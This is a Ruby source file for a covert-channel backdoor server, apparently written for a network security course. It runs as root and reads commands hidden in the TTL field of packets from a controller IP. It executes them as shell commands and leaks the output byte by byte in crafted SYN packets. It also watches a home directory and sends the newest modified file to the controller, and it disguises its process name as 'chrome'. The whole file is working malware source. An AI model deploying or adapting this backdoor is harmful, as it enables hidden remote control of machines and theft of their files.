#!/usr/bin/env ruby
# A00746060
# Harjinder Daniel Khatkar
# Server.rb
# sudo ruby server.rb
#
# This program communicates with the client machine as a backdoor
# The backdoor will respond to basic shell commands and send the results back to the client
# The backdoor can also receive a 'get' command, which will send back the most recently
# modified file on the directory the backdoor is watching.
# The backdoor will send and receive all data through a covert channel byte by byte.
require 'rubygems'
require 'thread'
require 'packetfu'
require 'date'
require 'rb-inotify'
include PacketFu

# This is the server class which contains all the backdoor functions.
class Server
    
    # global variables for information from the config file.
    @interface
    @clientIP
    @sourcePort
    @destPort
    @clientMac
    @myInfo
    @date
    
    # Function to start our server. It will continously be listening for
    # Commands until the program is closed.
    # This function also creates a watching thread which will watch a directory
    # alongside the loop for commands.
    def start

        #read in information from the server client file.
        read_config()
        
        #directory to watch
        @filepath = "/home/dan/Documents/"
        
        # create threads for server
        watch_thread = Thread.new{watching(@filepath)}
        while_thread = Thread.new{start_while()}
        watch_thread.join
        while_thread.join

        # Catch the interrupt and kill the threads
        rescue Interrupt
        Thread.kill(watch_thread)
        Thread.kill(while_thread)
        exit 0

    end
	
    # Function that loops and waits for commands from the client.
    def start_while()

        @file = 0
        @fullpath = 0
        while true do
            # Receive the command from the client.
            command = receive_command()
            
            # Decrypt Command using xor
            decrypted_command = xor(command, @date)
            puts decrypted_command
            #Check if server has to send the file or send results of a shell command
            if command == "get"
			
                puts @file
                puts @fullpath
                # If no file has been modified, send an error message to client.
                # Else send the file.
                if @file == 0 and @fullpath == 0
                    error = "ERROR"
                    puts error
                    send(error)
                else
                    send(@file)
                    puts "send file"
                    send_file(@fullpath)

                    puts "sent"
                end
            else
                sleep 1
                send_command_results(command)
            end
        end
    end

    # Function to watch a directory using rb-inotify gem.
    # Saves the file and path to the global variables.
    def watching(filepath)
        
        notifier = INotify::Notifier.new
        notifier.watch(filepath, :close_write) do |event|
            # The #name field of the event object contains the name of the affected file
            @file = event.name
            @fullpath = filepath + event.name
            puts @file
        end
        notifier.run
    end
    
    # Function to send the file name that has been modifed, or an error message back
    # to client.
    def send(name)
        # encrypt the message or name
        name = xor(name, @date)
        
        # send the message or name of the file byte by byte in ttl field.
    	name.each_char do |c|
            tcp_pkt = TCPPacket.new(:config => @myInfo)
		 	tcp_pkt.tcp_flags.syn=1
		 	tcp_pkt.tcp_dst= @destPort
		 	tcp_pkt.tcp_src= @sourcePort
		 	tcp_pkt.eth_daddr = @clientMac
		 	tcp_pkt.ip_daddr= @clientIP
			tcp_pkt.ip_ttl = c
		 	tcp_pkt.recalc
		 	tcp_pkt.to_w(@interface)
		 	sleep 0.1
			puts tcp_pkt.ip_ttl
        end
        puts "Message has been sent"
        
        # send final packet to tell client no more data incoming.
		tcp_pkt = TCPPacket.new(:config => @myInfo)
		tcp_pkt.tcp_flags.syn=1
		tcp_pkt.tcp_dst= @destPort
		tcp_pkt.tcp_src= @sourcePort
		tcp_pkt.eth_daddr = @clientMac
		tcp_pkt.ip_daddr= @clientIP
		tcp_pkt.ip_ttl = 0
		tcp_pkt.recalc
		tcp_pkt.to_w(@interface)
		puts tcp_pkt.ip_ttl
        puts "done send name exit"

    end

    # Function to send file to client.
    def send_file(path)
        puts path
        # open file
        send = File.open(path, "rb")
        
        # send the file byte by byte in the ttl field
        send.each_byte do |c|
            if c > 31
                tcp_pkt = TCPPacket.new(:config => @myInfo)
                tcp_pkt.tcp_flags.syn=1
                tcp_pkt.tcp_dst= @destPort
                tcp_pkt.tcp_src= @sourcePort
                tcp_pkt.eth_daddr = @clientMac
                tcp_pkt.ip_daddr= @clientIP
                tcp_pkt.ip_ttl = c
                tcp_pkt.recalc
                tcp_pkt.to_w(@interface)
                sleep 0.1
                puts tcp_pkt.ip_ttl
            end
      	end
        puts "File sent"
        # send final packet to tell client no more data incoming
		tcp_pkt = TCPPacket.new(:config => @myInfo)
		tcp_pkt.tcp_flags.syn=1
		tcp_pkt.tcp_dst= @destPort
		tcp_pkt.tcp_src= @sourcePort
		tcp_pkt.eth_daddr = @clientMac
		tcp_pkt.ip_daddr= @clientIP
		tcp_pkt.ip_ttl = 0
		tcp_pkt.recalc
		tcp_pkt.to_w(@interface)
		puts tcp_pkt.ip_ttl
        puts "done send file exit"
    end
    
    # Function to send results from shell command execution.
    def send_command_results(command)
        # execute the command
    	comm = `#{command}`
        
        # send command results byte by byte in ttl field.
    	comm.each_byte do |c|
            tcp_pkt = TCPPacket.new(:config => @myInfo)
		 	tcp_pkt.tcp_flags.syn=1
		 	tcp_pkt.ip_ttl = c
		 	tcp_pkt.tcp_dst= @destPort
		 	tcp_pkt.tcp_src= @sourcePort
		 	tcp_pkt.eth_daddr = @clientMac
		 	tcp_pkt.ip_daddr= @clientIP
		 	tcp_pkt.recalc
		 	tcp_pkt.to_w(@interface)
		 	sleep 0.1
			puts tcp_pkt.ip_ttl
        end
		puts "Results have been sent"
        
        # send final packet to tell client all the sending is finished
		tcp_pkt = TCPPacket.new(:config => @myInfo)
		tcp_pkt.tcp_flags.syn=1
		tcp_pkt.ip_ttl = 0
		tcp_pkt.tcp_dst= @destPort
		tcp_pkt.tcp_src= @sourcePort
		tcp_pkt.eth_daddr = @clientMac
		tcp_pkt.ip_daddr= @clientIP
		tcp_pkt.recalc
		tcp_pkt.to_w(@interface)	
		puts "done results exit" 	
    end
    
    # Function to receive the command from the client.
    def receive_command()
		command = ""
        
        # Receive packets directed to port 9000 and from only the client IP.
        # this is the authentication
        capture_session = Capture.new(:iface => @interface,
    						:start => true,
    						:promisc => true,
    						:filter => "dst port 9000 and src #{@clientIP}")
       
        # Once packets come in read ttl field and add each to command variable
        capture_session.stream.each do |p|
            pkt = Packet.parse(p)
							
            char = pkt.ip_ttl
  
            if char == 0
                return command
            end
			command << char
			puts char
        end
    end
        
    # Function to read from the server config file.
    # Takes in client IP, MAC and ports to send to. Also generates server information.
    def read_config()
        
        config = Array.new
        File.foreach("server_config.txt") {|line| 
            config.push(line)
        }
        @interface = config[0].strip
        @clientIP = config[1].strip
        @sourcePort = config[2].strip.to_i
        @destPort = config[3].strip.to_i
        @clientMac = Utils.arp(@clientIP, :iface => @interface) 
        @myInfo = Utils.whoami?(:iface => @interface)
	@date = Date.today.to_s.strip
        
    end
    
    # Function to perform XOR encryption on file name
    def xor(input, key)
        x = input.length
        y = key.length

        z = x -1
        for i in 1..z
            input[i] ^= key[(i%y)]
        end

        return input
    end
    
end

# Start server
begin
    # mask our server process as "Chrome"
	$0 = "chrome"
	server = Server.new
	server.start
end
